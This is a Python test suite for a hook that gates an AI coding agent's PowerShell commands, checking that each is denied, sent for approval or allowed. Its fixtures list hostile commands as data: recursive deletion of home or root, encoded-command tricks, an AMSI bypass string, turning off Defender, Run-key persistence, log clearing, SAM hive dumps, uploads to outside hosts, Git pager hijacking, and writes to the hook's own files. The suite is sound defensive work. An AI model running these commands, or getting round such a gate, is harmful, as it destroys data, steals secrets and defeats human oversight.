#!/usr/bin/env python3
"""Tests for hooks/block_destructive_powershell.py.

Runs the hook in a persistent subprocess against synthetic Claude Code
payloads. This suite has not exercised a live PowerShell tool call.
"""
import base64
import json
import os
import subprocess
import sys
import tempfile
import unittest

# discover -s tests puts this directory on the path; a direct
# `unittest tests.<module>` run does not, and CI uses both.
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import gate_corpus
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
HOOK_PATH = REPO_ROOT / "hooks" / "block_destructive_powershell.py"
BLOCKING_EXIT_CODE = 2
_HOOK_WORKER = None


def hook_worker():
    """Return the process-local persistent PowerShell hook worker."""
    global _HOOK_WORKER
    if _HOOK_WORKER is None:
        _HOOK_WORKER = gate_corpus.HookWorker(HOOK_PATH)
    return _HOOK_WORKER


def run_hook(command, permission_mode: str = "default", cwd: str = "") -> tuple:
    """Return the hook's (exit code, permission decision) for `command`."""
    payload = {
        "hook_event_name": "PreToolUse",
        "tool_name": "PowerShell",
        "permission_mode": permission_mode,
        "tool_input": {"command": command},
    }
    if cwd:
        payload["cwd"] = cwd
    code, stdout, _stderr = hook_worker().invoke(payload)
    try:
        decision = json.loads(stdout)["hookSpecificOutput"]["permissionDecision"]
    except (ValueError, KeyError):
        decision = ""
    return code, decision


def encoded(command: str) -> str:
    """Return PowerShell's UTF-16LE Base64 representation of `command`."""
    return base64.b64encode(command.encode("utf-16le")).decode("ascii")


class RemoveItemTest(unittest.TestCase):
    """Remove-Item and its aliases, across PowerShell's parameter forms."""

    CASES = (
        ("Remove-Item -Recurse -Force C:\\work\\build", "ask"),
        ("Remove-Item -Rec -Fo C:\\work\\build", "ask"),
        ("Remove-Item -r C:\\work\\build", "ask"),
        ("remove-item -RECURSE C:\\work\\build", "ask"),
        ("ri -Recurse C:\\work\\build", "ask"),
        ("rm -Recurse C:\\work\\build", "ask"),
        ("del -Recurse C:\\work\\build", "ask"),
        ("rd -Recurse C:\\work\\build", "ask"),
        ("rmdir -Recurse C:\\work\\build", "ask"),
        ("Remove-Item -Recurse $env:USERPROFILE", "deny"),
        ("Remove-Item -Recurse $HOME", "deny"),
        ("Remove-Item -Recurse C:\\", "deny"),
        ("Remove-Item build.log", ""),
        ("Get-ChildItem -Recurse C:\\work", ""),
    )

    def test_deletion_forms_are_classified(self):
        for command, expected in self.CASES:
            with self.subTest(command=command):
                _, decision = run_hook(command)
                self.assertEqual(decision, expected)


class StatementBoundaryTest(unittest.TestCase):
    """A destructive statement after a separator is still a statement."""

    CASES = (
        ("Write-Output x; Remove-Item -Recurse C:\\work\\build", "ask"),
        ("Write-Output x\nRemove-Item -Recurse C:\\work\\build", "ask"),
        ("Get-Process | Remove-Item -Recurse C:\\work\\build", "ask"),
        ("Test-Path x && Remove-Item -Recurse C:\\work\\build", "ask"),
        ("Test-Path x || Remove-Item -Recurse C:\\work\\build", "ask"),
        ("Remove-Item -Recurse C:\\work\\build > log.txt", "ask"),
    )

    def test_statements_after_a_separator_are_classified(self):
        for command, expected in self.CASES:
            with self.subTest(command=command):
                _, decision = run_hook(command)
                self.assertEqual(decision, expected)


class WrapperTest(unittest.TestCase):
    """Indirection hides the command the same way a shell does."""

    CASES = (
        ("& Remove-Item -Recurse C:\\work\\build", "ask"),
        ("Start-Process Remove-Item -Recurse C:\\work\\build", "ask"),
        ("powershell -Command 'Remove-Item -Recurse C:\\work\\build'", "deny"),
        ("pwsh -c 'Remove-Item -Recurse C:\\work\\build'", "deny"),
        ("cmd /c rd /s /q C:\\work\\build", "deny"),
        ("Invoke-Expression 'Remove-Item -Recurse C:\\work\\build'", "deny"),
    )

    def test_wrapped_commands_are_classified(self):
        for command, expected in self.CASES:
            with self.subTest(command=command):
                _, decision = run_hook(command)
                self.assertEqual(decision, expected)


class EncodedCommandTest(unittest.TestCase):
    """EncodedCommand is decoded before the nested command is classified."""

    FLAGS = (
        "-e", "-ec", "-en", "-enc", "-enco", "-encod", "-encode",
        "-encoded", "-encodedc", "-encodedco", "-encodedcom",
        "-encodedcomm", "-encodedcomma", "-encodedcomman",
        "-encodedcommand",
    )

    def test_every_supported_spelling_classifies_destructive_payloads(self):
        payload = encoded("Remove-Item -Recurse C:\\work\\build")
        for program in ("powershell", "powershell.exe", "pwsh", "pwsh.exe"):
            for flag in self.FLAGS:
                with self.subTest(program=program, flag=flag):
                    _, decision = run_hook(f"{program} {flag} {payload}")
                    self.assertEqual(decision, "deny")

    def test_benign_encoded_payload_denies(self):
        for flag in self.FLAGS:
            with self.subTest(flag=flag):
                _, decision = run_hook(f"pwsh {flag} {encoded('Get-ChildItem')}")
                self.assertEqual(decision, "deny")

    def test_malformed_encoded_payloads_deny(self):
        invalid_utf16 = base64.b64encode(bytes((0, 216))).decode("ascii")
        malformed = (
            "pwsh -enc",
            "pwsh -enc !!!",
            "pwsh -enc QQ==",
            f"pwsh -enc {invalid_utf16}",
        )
        for command in malformed:
            with self.subTest(command=command):
                code, decision = run_hook(command)
                self.assertEqual(code, BLOCKING_EXIT_CODE)
                self.assertEqual(decision, "deny")

    def test_encoded_recursion_exhaustion_denies(self):
        command = "Get-ChildItem"
        for _ in range(6):
            command = f"pwsh -enc {encoded(command)}"
        code, decision = run_hook(command)
        self.assertEqual(code, BLOCKING_EXIT_CODE)
        self.assertEqual(decision, "deny")

    def test_e_is_not_encoded_command_for_an_unrelated_interpreter(self):
        _, decision = run_hook("python -e not-base64")
        self.assertEqual(decision, "")

    def test_command_flag_without_payload_still_denies(self):
        _, decision = run_hook("pwsh -Command")
        self.assertEqual(decision, "deny")


class PowerShellPolicyTest(unittest.TestCase):
    """High-risk PowerShell families receive the configured policy tier."""

    UNCONDITIONAL_DENY_PROGRAMS = (
        "add-mppreference", "add-type", "clear-disk", "connect-pssession",
        "disable-bitlocker", "disable-netadapter", "enable-netadapter",
        "enable-psremoting", "enter-pssession", "export-pfxcertificate",
        "format-volume", "get-secret", "import-certificate",
        "import-pfxcertificate", "invoke-expression", "new-netfirewallrule",
        "new-netroute", "new-pssession", "new-selfsignedcertificate",
        "new-service", "new-vpnconnection", "register-objectevent",
        "register-scheduledtask", "remove-mppreference",
        "remove-netfirewallrule", "remove-netroute", "remove-service",
        "remove-scheduledtask", "remove-vpnconnection", "send-mailmessage",
        "set-authenticodesignature", "set-dnsclientserveraddress",
        "set-executionpolicy", "set-mppreference", "set-netadapter",
        "set-netfirewallprofile", "set-netfirewallrule", "set-netroute",
        "set-scheduledtask", "set-vpnconnection", "set-wsmanquickconfig",
        "start-job", "unregister-scheduledtask", "unlock-bitlocker",
    )
    UNRELATED_OPERANDS = (
        "",
        "opaque-value",
        "-Path Z:\\unrelated-location\\random.data",
        "\\\\unrelated-host\\unrelated-share\\random.object",
    )
    REMOTE_COMMAND_PATHS = (
        "'\\\\alpha-host\\first-share\\no-extension'",
        "'\\\\beta-host\\second-share\\arbitrary.object'",
        "'\\\\gamma-host\\third-share\\different-name.ps1'",
        "'//delta-host/fourth-share/another-name.exe'",
    )
    TRANSFER_CASES = (
        "scp first.random first-user@first-host:/first-location",
        "scp second.data second-user@second-host:/second-location",
        "sftp third.object third-user@third-host:/third-location",
        "ftp fourth.payload fourth-host:/fourth-location",
        "azcopy fifth.opaque https://fifth-host.test/fifth-location",
        "rclone sixth.content sixth-remote:sixth-location",
        "curl -T seventh.random https://seventh-host.test/seventh-location",
        "curl --upload-file eighth.data https://eighth-host.test/eighth-location",
        "curl -Tninth.object https://ninth-host.test/ninth-location",
        "curl --upload-file=tenth.payload https://tenth-host.test/tenth-location",
        "Start-BitsTransfer -TransferType Upload eleventh.random"
        " https://eleventh-host.test/eleventh-location",
        "Start-BitsTransfer -TransferT:Upload twelfth.data"
        " https://twelfth-host.test/twelfth-location",
    )
    MUTATION_CASES = (
        "Format-Volume -DriveLetter D",
        "Format-Volume -DriveLetter X",
        "Format-Volume -Path Z:\\mounted-volume",
        "Disable-BitLocker -MountPoint C:",
        "Disable-BitLocker -MountPoint X:",
        "Disable-BitLocker -MountPoint Z:\\encrypted-volume",
        "secedit /configure /db first-policy.sdb",
        "secedit /configure /db Z:\\second-location\\second-policy.data",
        "auditpol /set /category:* /success:disable",
        "auditpol /clear /y",
        "wevtutil cl Security",
        "wevtutil clear-log Application",
        "bcdedit /set recoveryenabled no",
        "bcdedit /deletevalue safeboot",
        "route add 10.20.0.0 mask 255.255.0.0 10.0.0.1",
        "route delete 192.0.2.0",
        "reg save HKLM\\SAM first.backup",
        "reg export HKLM\\SECURITY Z:\\second-location\\second.data",
    )
    WEB_TRANSFER_CASES = (
        "Invoke-WebRequest https://first-host.test/first.exe -OutFile first.data",
        "Invoke-WebRequest https://second-host.test/second.ps1 -OutFile second.object",
        "Invoke-RestMethod https://third-host.test/third -Method Delete",
        "Invoke-WebRequest https://fourth-host.test/fourth -Method:Put",
        "Invoke-RestMethod https://fifth-host.test/fifth -Body fifth.data",
        "Invoke-WebRequest https://sixth-host.test/sixth -InFile sixth.object",
    )

    DENY = (
        "Invoke-Expression 'Get-Date'",
        "iex 'Get-Date'",
        "Invoke-Command -ComputerName server -ScriptBlock { Get-Date }",
        "Invoke-Command -Comp server -ScriptBlock { Get-Date }",
        "icm -Session $session -ScriptBlock { Get-Date }",
        "pwsh -Command 'Get-Date'",
        "powershell -ExecutionPolicy Bypass -File safe.ps1",
        "pwsh -WindowStyle Hidden -File safe.ps1",
        "Add-Type -TypeDefinition 'public class X {}'",
        "[System.Reflection.Assembly]::Load($bytes)",
        "[System.Diagnostics.Process]::Start('cmd.exe')",
        "New-Object System.Net.WebClient",
        "New-Object -ComObject WScript.Shell",
        "Start-Process -FilePath $program",
        ". $scriptPath",
        "$dynamicCommand argument",
        "Import-Module $modulePath",
        "pwsh -File $scriptPath",
        "'\\\\server\\share\\remote-tool.exe'",
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
        "Register-ObjectEvent -InputObject $x -EventName Changed -Action {}",
        "Start-Job -ScriptBlock { Get-Date }",
        "Set-ExecutionPolicy RemoteSigned",
        "pwsh -ExecutionPolicy RemoteSigned -File scripts\\build.ps1",
        "Set-MpPreference -DisableRealtimeMonitoring $true",
        "Add-MpPreference -ExclusionPath C:\\work",
        "New-NetFirewallRule -DisplayName x -Direction Inbound -Action Allow",
        "Set-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion"
        "\\Run -Name x -Value evil.exe",
        "Set-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion"
        "\\Internet Settings -Name ProxyServer -Value proxy.example.test",
        "Set-Content $PROFILE persistence-code",
        "New-CimInstance -Namespace root\\subscription -ClassName __EventFilter",
        "secedit /configure /db policy.sdb",
        "auditpol /set /category:* /success:disable",
        "wevtutil cl Security",
        "bcdedit /set recoveryenabled no",
        "netsh advfirewall set allprofiles state off",
        "reg save HKLM\\SAM opaque.backup",
        "manage-bde -protectors -disable C:",
        "manage-bde -status",
        "bcdedit /enum",
        "ssh host.example.test",
        "route add 10.20.0.0 mask 255.255.0.0 10.0.0.1",
        "winrs -r:server cmd",
        "schtasks /create /tn task /tr opaque.exe /sc daily",
        "Format-Volume -DriveLetter D",
        "Clear-Disk -Number 1 -RemoveData",
        "Disable-BitLocker -MountPoint C:",
        "Import-Certificate -FilePath root.cer -CertStoreLocation Cert:\\LocalMachine\\Root",
        "Set-AuthenticodeSignature script.ps1 $certificate",
        "Export-PfxCertificate -Cert cert:\\CurrentUser\\My\\1 -FilePath key.pfx",
        "Get-Secret production-password",
        "Register-ScheduledTask -TaskName x -Action $action",
        "New-Service -Name x -BinaryPathName evil.exe",
        "Enable-PSRemoting -Force",
        "Set-WSManQuickConfig -Force",
        "New-PSSession -ComputerName server",
        "Enter-PSSession -ComputerName server",
        "Copy-Item source.database '\\\\server\\share'",
        "New-PSDrive X -PSProvider FileSystem -Root \\\\server\\share",
        "scp records.csv user@host:/tmp",
        "curl --upload-file snapshot.binary https://example.test/upload",
        "Invoke-WebRequest https://example.test/upload -Method Post"
        " -InFile opaque.data",
        "Invoke-RestMethod https://example.test/item -Method Delete",
        "Invoke-RestMethod https://example.test/query -Body opaque.data",
        "Invoke-WebRequest https://example.test/item -Method:Post",
        "Send-MailMessage -To x@example.test -Body data -SmtpServer mail.example.test",
        "Remove-Item Cert:\\CurrentUser\\My\\opaque-thumbprint",
        "Invoke-WebRequest https://example.test/artifact.exe -OutFile random.cache",
        "Set-DnsClientServerAddress -InterfaceAlias Ethernet -ServerAddresses 1.2.3.4",
    )

    ASK = (
        "Start-Process notepad.exe",
        "New-Object System.Text.StringBuilder",
        "& .\\build.ps1",
        ". .\\profile.ps1",
        "Invoke-Command -ScriptBlock { Get-Date }",
        "Invoke-Item report.data",
        "Import-Module Pester",
        "ipmo Pester",
        "Install-Module Pester",
        "Update-Module Pester",
        "Find-Module Pester",
        "Set-Service app -StartupType Manual",
        "Restart-Service app",
        "Stop-Service app",
        "Set-ItemProperty HKCU:\\Software\\Example -Name x -Value y",
        "Set-Content *.binary replacement",
        "Copy-Item -Recurse src out",
        "Get-Credential",
        "Get-LocalUser",
        "New-LocalUser service-user",
        "Get-ADUser alice",
        "Set-ADUser alice -Enabled $false",
        "Invoke-WebRequest https://example.test/data.json",
        "Invoke-WebRequest https://example.test/data.json -Method Get",
        "iwr https://example.test/alternate.data",
        "Start-BitsTransfer https://example.test/data.json data.json",
        "Test-NetConnection example.test -Port 443",
        "Get-NetTCPConnection",
        "Resolve-DnsName example.test",
        "nslookup example.test",
        "Get-CimInstance Win32_LogonSession",
        "Get-ChildItem Cert:\\CurrentUser\\My",
        "gci Cert:\\CurrentUser\\Root",
        "saps notepad.exe",
        "pwsh -File scripts\\build.ps1",
        "pwsh -NoProfile -File scripts\\build.ps1",
        "pwsh -WindowStyle Normal -File scripts\\build.ps1",
        ".\\tools\\local-tool.exe",
        "curl https://example.test/opaque.data",
        "secedit /analyze /db policy.sdb",
        "route print",
        "[System.Net.Dns]::GetHostAddresses('example.test')",
    )

    ARCHIVE_CASES = (
        "Compress-Archive project-alpha\\* artifact-145.zip",
        "Compress-Archive -Path logs\\*.json -DestinationPath snapshot.data",
        "Expand-Archive package-938.zip extraction-area",
        "Expand-Archive -Path unrelated.bundle -DestinationPath generated-files",
    )

    FILE_NAME_CASES = (
        ("Set-Content image.bin value", ""),
        ("Set-Content records.csv value", ""),
        ("Set-Content application.state $value", ""),
        ("Copy-Item source.database destination.backup", ""),
        ("Set-Content *.binary value", "ask"),
        ("Set-Content $outputPath value", "ask"),
        ("Clear-Content opaque.database", "ask"),
        ("Copy-Item -Recurse source-tree generated-tree", "ask"),
        ("Copy-Item $sourcePath generated.backup", "ask"),
        ("cp -Rec input-tree output-tree", "ask"),
        ("Copy-Item opaque.data '\\\\server\\drop'", "deny"),
        ("Copy-Item opaque.data C:\\Windows\\System32\\opaque.config", "deny"),
        ("Export-PfxCertificate -Cert cert:\\CurrentUser\\My\\1"
         " -FilePath opaque.backup", "deny"),
        ("curl --upload-file archive.binary https://example.test/upload", "deny"),
    )

    ALLOW = (
        "Get-ChildItem .",
        "Test-Path README.md",
        "Get-Content README.md",
        "ConvertTo-Json @{name='value'}",
        "Get-Service app",
        "Set-Content application.state value",
        "Copy-Item source.database destination.backup",
        "wevtutil qe Application /c:1",
        "auditpol /get /category:*",
        "reg query HKCU\\Software\\Example",
        "pwsh --version",
    )

    def test_deny_families_are_refused(self):
        for command in self.DENY:
            with self.subTest(command=command):
                self.assertEqual(run_hook(command)[1], "deny")

    def test_unconditional_deny_families_ignore_operands(self):
        for program in self.UNCONDITIONAL_DENY_PROGRAMS:
            for operands in self.UNRELATED_OPERANDS:
                command = " ".join(value for value in (program, operands) if value)
                with self.subTest(program=program, operands=operands):
                    self.assertEqual(run_hook(command)[1], "deny")

    def test_remote_command_paths_ignore_fixture_names(self):
        for command in self.REMOTE_COMMAND_PATHS:
            with self.subTest(command=command):
                self.assertEqual(run_hook(command)[1], "deny")

    def test_transfer_rules_ignore_sources_and_endpoints(self):
        for command in self.TRANSFER_CASES:
            with self.subTest(command=command):
                self.assertEqual(run_hook(command)[1], "deny")

    def test_mutation_rules_ignore_fixture_operands(self):
        for command in self.MUTATION_CASES:
            with self.subTest(command=command):
                self.assertEqual(run_hook(command)[1], "deny")

    def test_web_transfer_rules_ignore_fixture_endpoints(self):
        for command in self.WEB_TRANSFER_CASES:
            with self.subTest(command=command):
                self.assertEqual(run_hook(command)[1], "deny")

    def test_bounded_administration_asks(self):
        for command in self.ASK:
            with self.subTest(command=command):
                self.assertEqual(run_hook(command)[1], "ask")

    def test_archive_policy_does_not_depend_on_example_filenames(self):
        for command in self.ARCHIVE_CASES:
            with self.subTest(command=command):
                self.assertEqual(run_hook(command)[1], "ask")

    def test_file_policy_uses_operation_and_path_properties(self):
        for command, expected in self.FILE_NAME_CASES:
            with self.subTest(command=command):
                self.assertEqual(run_hook(command)[1], expected)

    def test_routine_local_operations_pass(self):
        for command in self.ALLOW:
            with self.subTest(command=command):
                self.assertEqual(run_hook(command)[1], "")


class GitDelegationTest(unittest.TestCase):
    """git decisions come from the shared core, so both shells agree."""

    CASES = (
        ("git push --force", "ask"),
        ("git reset --hard", "deny"),
        ("git push --force-with-lease", "ask"),
        ("git push origin :main", "ask"),
        ("git commit --amend", "ask"),
        ("git status", ""),
        ("git push origin feat/x", ""),
    )

    def test_git_commands_match_the_bash_gate(self):
        for command, expected in self.CASES:
            with self.subTest(command=command):
                _, decision = run_hook(command)
                self.assertEqual(decision, expected)


class TestWriteTest(unittest.TestCase):
    """A redirect into a test file is an edit no Edit matcher sees."""

    def test_redirect_into_a_test_file_gates(self):
        _, decision = run_hook("Write-Output x > tests/test_auth.py")
        self.assertEqual(decision, "ask")

    def test_redirect_into_a_source_file_passes(self):
        _, decision = run_hook("Write-Output x > src/app.js")
        self.assertEqual(decision, "")

    def test_gate_file_writes_ask(self):
        commands = (
            "Write-Output x > hooks/new.py",
            "Write-Output x > scripts/check_branch_name.py",
            "Set-Content hooks/new.py x",
            "Add-Content .claude/settings.json x",
            "Set-Content scripts/check_git_identity.py x",
            "Copy-Item source.py hooks/new.py",
            "Move-Item source.py .claude/new.json",
            "Out-File .claude/settings.json -InputObject x",
        )
        for command in commands:
            with self.subTest(command=command):
                _, decision = run_hook(command)
                self.assertEqual(decision, "ask")

    def test_named_write_paths_gate_regardless_of_parameter_order(self):
        commands = (
            "Set-Content -Value x -Path hooks/new.py",
            "Add-Content -Value x -LiteralPath .claude/settings.json",
            "Out-File -InputObject x -FilePath hooks/new.py",
            "Copy-Item -Destination hooks/new.py -Path source.py",
            "Move-Item -Destination .claude/new.json -LiteralPath source.py",
            "sc -Value x -Path hooks/new.py",
            "cpi -Destination hooks/new.py -Path source.py",
        )
        for command in commands:
            with self.subTest(command=command):
                self.assertEqual(run_hook(command)[1], "ask")

    def test_abbreviated_write_parameters_gate_regardless_of_order(self):
        commands = (
            "Set-Content -Va x -Pat hooks/new.py",
            "Add-Content -Va x -L .claude/settings.json",
            "Out-File -Inp x -Fi hooks/new.py",
            "Copy-Item -Des hooks/new.py -Pat source.py",
            "Move-Item -Des .claude/new.json -L source.py",
            "sc -Va x -Pat hooks/new.py",
            "cpi -Des hooks/new.py -Pat source.py",
        )
        for command in commands:
            with self.subTest(command=command):
                self.assertEqual(run_hook(command)[1], "ask")

    def test_linked_directory_into_hooks_is_gated(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            hooks = root / "hooks"
            hooks.mkdir()
            linked = root / "linked"
            try:
                linked.symlink_to(hooks, target_is_directory=True)
            except (OSError, NotImplementedError) as error:
                self.skipTest(f"this platform cannot create directory links: {error}")
            decision = run_hook(
                "Set-Content -Va x -Pat linked/new.py", cwd=directory)[1]
        self.assertEqual(decision, "ask")


class GitEnvironmentTest(unittest.TestCase):
    """Persistent PowerShell Git variables must not evade a later read."""

    def test_relevant_environment_assignments_are_gated(self):
        commands = (
            "$env:GIT_PAGER='/tmp/evil'; git status",
            "$env:GIT_EXTERNAL_DIFF='/tmp/evil'; git diff",
            "$env:GIT_CONFIG_GLOBAL='/tmp/evil'; git status",
            "$env:GIT_CONFIG_COUNT='1'; git status",
            "$env:GIT_CONFIG_KEY_0='core.pager'; git status",
            "$env:GIT_CONFIG_VALUE_0='/tmp/evil'; git status",
        )
        for command in commands:
            with self.subTest(command=command):
                self.assertEqual(run_hook(command)[1], "ask")

    def test_provider_and_braced_environment_assignments_are_gated(self):
        commands = (
            "${env:GIT_PAGER}='/tmp/evil'; git status",
            "Set-Item Env:GIT_EXTERNAL_DIFF /tmp/evil; git diff",
            "Set-Item -Path Env:GIT_CONFIG_GLOBAL -Value /tmp/evil; git status",
            "Set-Variable -Name env:GIT_PAGER -Value /tmp/evil; git status",
            "sv -Name env:GIT_CONFIG_COUNT -Value 1; git status",
        )
        for command in commands:
            with self.subTest(command=command):
                self.assertEqual(run_hook(command)[1], "ask")


class FailClosedTest(unittest.TestCase):
    """A gate that cannot read its input must not answer 'fine'."""

    def test_unattended_modes_deny(self):
        for mode in ("bypassPermissions", "dontAsk", "", "something-new"):
            with self.subTest(mode=mode):
                code, decision = run_hook(
                    "Remove-Item -Recurse C:\\work\\build", mode)
                self.assertEqual(code, BLOCKING_EXIT_CODE)
                self.assertEqual(decision, "deny")

    def test_non_string_command_denies(self):
        for value in (None, 5, ["Remove-Item"], {"a": 1}):
            with self.subTest(value=value):
                code, decision = run_hook(value)
                self.assertEqual(code, BLOCKING_EXIT_CODE)
                self.assertEqual(decision, "deny")

    def test_malformed_payload_denies(self):
        result = subprocess.run(
            [sys.executable, str(HOOK_PATH)],
            input="not json", capture_output=True, text=True, check=False)
        self.assertEqual(result.returncode, BLOCKING_EXIT_CODE)

    def test_other_tools_are_ignored(self):
        payload = {
            "hook_event_name": "PreToolUse",
            "tool_name": "Read",
            "permission_mode": "default",
            "tool_input": {"file_path": "x"},
        }
        result = subprocess.run(
            [sys.executable, str(HOOK_PATH)],
            input=json.dumps(payload), capture_output=True, text=True,
            check=False)
        self.assertEqual(result.returncode, 0)


if __name__ == "__main__":
    unittest.main()


class CorpusTest(unittest.TestCase):
    """Every known PowerShell bypass reaches the verdict the corpus records."""

    def test_every_corpus_row_reaches_its_verdict(self):
        for command, expected, why in gate_corpus.POWERSHELL_CASES:
            with self.subTest(command=command, why=why):
                _, decision = run_hook(command)
                self.assertEqual(decision or gate_corpus.ALLOW, expected)
